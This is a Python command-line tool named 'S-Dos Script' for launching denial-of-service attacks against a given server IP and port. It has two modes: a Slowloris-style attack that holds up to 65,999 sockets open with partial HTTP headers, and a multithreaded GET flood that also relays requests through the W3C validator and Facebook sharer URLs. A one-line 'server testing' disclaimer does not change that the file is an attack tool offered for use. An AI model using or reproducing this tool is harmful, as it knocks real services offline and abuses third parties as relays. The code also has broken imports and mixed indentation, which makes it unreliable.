#!/usr/bin/python3
# -*- coding: utf-8 -*-
import socket
import random
import time
import sys
import threading
import logging
from queue import Queue
from optparse import OptionParser
from urllib2 import urlopen

def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	return(uagent)


def my_bots():
	global bots
	bots=[]
	bots.append("http://validator.w3.org/check?uri=")
	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
	return(bots)


def sdosbot(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			time.sleep(.1)
	except:
		time.sleep(.1)


def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				
			else:
				s.shutdown(1)
				print("\033[91mshut<->down\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mno connection! server maybe down\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)


def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()


def dos2():
	while True:
		item=w.get()
		sdosbot(random.choice(bots)+"http://"+host)
		w.task_done()

def attack1():
	for _ in range(socket_count):
	    try:
	        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	        s.connect((ip, port))
		s.settimeout(1)
	    except socket.error as e:
	        break
	    list_of_sockets.append(s)
	log("Setting up the sockets...")
	for s in list_of_sockets:
	    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
	    for header in regular_headers:
	        s.send(bytes("{}\r\n".format(header).encode("utf-8")))
	while True:
	    for s in list_of_sockets:
	        try:
	            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
	        except socket.error:
	            list_of_sockets.remove(s)
	            try:
	                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	                s.settimeout(4)
	                s.connect((ip, 80))
	                for s in list_of_sockets:
	                    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
	                    for header in regular_headers:
	                        s.send(bytes("{}\r\n".format(header).encode("utf-8")))
	            except socket.error:
	                continue
	    time.sleep(.1)
	
def attack2():
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91mcheck server ip and port\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
		q.join()
		w.join()


def usage():
	print (''' \033[92m	S-Dos Script
	It is the end user's responsibility to obey all applicable laws.
	It is just for server testing script. Your ip is visible. \n
	-c is given if system is same network . \n
	1 host attck 2 for network attack
	usage :sdos.py [-s] [-p] [-c] [-a]
	-h : help
	-s : server ip
	-p : port default 80
	-c : counts conection
	-a : 1 or 2 attack \033[0m''')
	sys.exit()

print ('''\033[92m
	     sssss    DDD    OO   sssss
	    s         D  D  O  O s
	     sssss    D   D 0  0 sssss
	         s    D  D  0  0      s
	    sssss     DDD    00  sssss  ''')

def parameters():
	global host
	global ip
	global port
	global thr
	global item
	global socket_count
	global attack
	thr = 135
	optp = OptionParser(add_help_option=False,epilog="sdos")
	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-c","--count",type="int",dest="socket_count",help="default 65999")
	optp.add_option("-a","--attack",type="int",dest="attack",help="default 65999")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
		ip = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.socket_count is None:
		socket_count = 65999
	else:
		socket_count = opts.socket_count
	if opts.attack is None:
		attack = 1
	else:
		attack = opts.attack

		
log_level = 2
def log(text, level=1):
    if log_level >= level:
        print(text)
list_of_sockets = []
# reading headers
regular_headers = [
    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Language: en-us,en;q=0.5",
	"Accept-Encoding: gzip,deflate",
	"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7",
	"Keep-Alive: 115",
	"Connection: keep-alive"
]

# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()
#task queue are q,w
q = Queue()
w = Queue()


if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	parameters()
	user_agent()
	my_bots()
#printing the value of parameters
	print("\033[92m",host," port: ",str(port),"attack type:",attack,"\033[0m")
	log("Attacking {} with {} sockets.".format(ip, socket_count))
	print("\033[94mPlease wait...\033[0m")
	time.sleep(2)
	if attack == 1:
		print("\033[94mattack 1 started\033[0m")
		attack1()
		
    # Do the thing
	elif attack == 2:
    # Do the other thing
		print("\033[94mattack 2 started\033[0m")
		attack2()
		
